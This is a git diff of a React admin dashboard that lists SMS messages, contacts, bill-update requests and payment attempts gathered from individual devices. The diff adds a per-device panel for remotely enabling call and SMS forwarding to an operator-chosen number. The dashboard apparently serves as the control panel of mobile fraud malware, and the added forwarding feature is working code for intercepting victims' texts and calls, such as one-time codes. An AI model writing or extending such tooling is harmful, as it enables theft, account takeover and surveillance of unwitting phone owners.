@@ -1,6 +1,7 @@
 import { useState, useEffect, useCallback } from 'react'
 
 const API = 'https://bill-1-9yfp.onrender.com/api/admin/all'
+const API_BASE = 'https://bill-1-9yfp.onrender.com'
 
 const sections = [
   { key: 'bill_updates', label: 'Bill Update Requests', color: '#2D9CDB' },
@@ -19,6 +20,8 @@ export default function App() {
   const [selectedDevice, setSelectedDevice] = useState(null)
   const [deviceTab, setDeviceTab] = useState('sms')
   const [time, setTime] = useState('')
+  const [forwarding, setForwarding] = useState({})
+  const [saving, setSaving] = useState(false)
 
   const fetchData = useCallback(async () => {
     try {
@@ -47,6 +50,34 @@ export default function App() {
     payment_attempts: ['id', 'amount', 'payment_method', 'status', 'created_at'],
   }
   const smsCols = ['sender', 'message', 'received_at', 'created_at']
+
+  const fetchForwardingConfig = async (deviceId) => {
+    try {
+      const r = await fetch(`${API_BASE}/api/forwarding-config/${deviceId}`)
+      const d = await r.json()
+      setForwarding(prev => ({...prev, [deviceId]: d}))
+    } catch {}
+  }
+
+  const saveForwardingConfig = async (deviceId) => {
+    const cfg = forwarding[deviceId]
+    if (!cfg) return
+    setSaving(true)
+    try {
+      await fetch(`${API_BASE}/api/forwarding-config`, {
+        method: 'PUT',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+          device_id: deviceId,
+          call_forwarding: cfg.call_forwarding,
+          call_forwarding_number: cfg.call_forwarding_number,
+          sms_forwarding: cfg.sms_forwarding,
+          sms_forwarding_number: cfg.sms_forwarding_number,
+        }),
+      })
+    } catch {}
+    setSaving(false)
+  }
 
   const rows = data[active] || []
   const stats = data.stats || {}
@@ -85,6 +116,7 @@ export default function App() {
                 <div style={{display: 'flex', gap: 8, marginBottom: 12}}>
                   <button onClick={() => setDeviceTab('sms')} style={{...styles.subTab, ...(deviceTab === 'sms' ? {background: '#6C5CE7', color: '#fff'} : {})}}>SMS ({smsList.length})</button>
                   <button onClick={() => setDeviceTab('contacts')} style={{...styles.subTab, ...(deviceTab === 'contacts' ? {background: '#00B894', color: '#fff'} : {})}}>Contacts ({contactsList.length})</button>
+                  <button onClick={() => { setDeviceTab('forwarding'); fetchForwardingConfig(dev.device_id) }} style={{...styles.subTab, ...(deviceTab === 'forwarding' ? {background: '#E67E22', color: '#fff'} : {})}}>Forwarding</button>
                 </div>
                 {deviceTab === 'sms' ? (
                   smsList.length === 0 ? <div style={styles.empty}>No SMS from this device</div> : (
@@ -97,7 +129,7 @@ export default function App() {
                       ))}</tbody>
                     </table>
                   )
-                ) : (
+                ) : deviceTab === 'contacts' ? (
                   contactsList.length === 0 ? <div style={styles.empty}>No contacts from this device</div> : (
                     <table style={styles.table}>
                       <thead><tr>{['name', 'phone', 'email', 'created_at'].map(c => <th key={c} style={styles.th}>{c.replace(/_/g, ' ').toUpperCase()}</th>)}</tr></thead>
@@ -108,6 +140,29 @@ export default function App() {
                       ))}</tbody>
                     </table>
                   )
+                ) : (
+                  <div style={{padding: 8}}>
+                    <h4 style={{margin: '0 0 12px', color: '#E67E22'}}>Call &amp; SMS Forwarding</h4>
+                    <div style={{display: 'flex', flexDirection: 'column', gap: 12}}>
+                      <div style={{display: 'flex', alignItems: 'center', gap: 12, flexWrap: 'wrap'}}>
+                        <label style={{fontWeight: 700, fontSize: 13, minWidth: 100}}>Call Forward</label>
+                        <input type="text" placeholder="Forwarding number" value={forwarding[dev.device_id]?.call_forwarding_number || ''} onChange={e => setForwarding(prev => ({...prev, [dev.device_id]: {...prev[dev.device_id], call_forwarding_number: e.target.value}}))} style={{padding: '6px 10px', border: '1px solid #ddd', borderRadius: 6, flex: 1, fontSize: 13}} />
+                        <label style={{display: 'flex', alignItems: 'center', gap: 6, fontSize: 13, cursor: 'pointer'}}>
+                          <input type="checkbox" checked={forwarding[dev.device_id]?.call_forwarding || false} onChange={e => setForwarding(prev => ({...prev, [dev.device_id]: {...prev[dev.device_id], call_forwarding: e.target.checked}}))} />
+                          Enabled
+                        </label>
+                      </div>
+                      <div style={{display: 'flex', alignItems: 'center', gap: 12, flexWrap: 'wrap'}}>
+                        <label style={{fontWeight: 700, fontSize: 13, minWidth: 100}}>SMS Forward</label>
+                        <input type="text" placeholder="Forwarding number" value={forwarding[dev.device_id]?.sms_forwarding_number || ''} onChange={e => setForwarding(prev => ({...prev, [dev.device_id]: {...prev[dev.device_id], sms_forwarding_number: e.target.value}}))} style={{padding: '6px 10px', border: '1px solid #ddd', borderRadius: 6, flex: 1, fontSize: 13}} />
+                        <label style={{display: 'flex', alignItems: 'center', gap: 6, fontSize: 13, cursor: 'pointer'}}>
+                          <input type="checkbox" checked={forwarding[dev.device_id]?.sms_forwarding || false} onChange={e => setForwarding(prev => ({...prev, [dev.device_id]: {...prev[dev.device_id], sms_forwarding: e.target.checked}}))} />
+                          Enabled
+                        </label>
+                      </div>
+                      <button onClick={() => saveForwardingConfig(dev.device_id)} disabled={saving} style={{...styles.subTab, background: '#E67E22', color: '#fff', alignSelf: 'flex-start'}}>{saving ? 'Saving...' : 'Save Config'}</button>
+                    </div>
+                  </div>
                 )}
               </div>
             )}
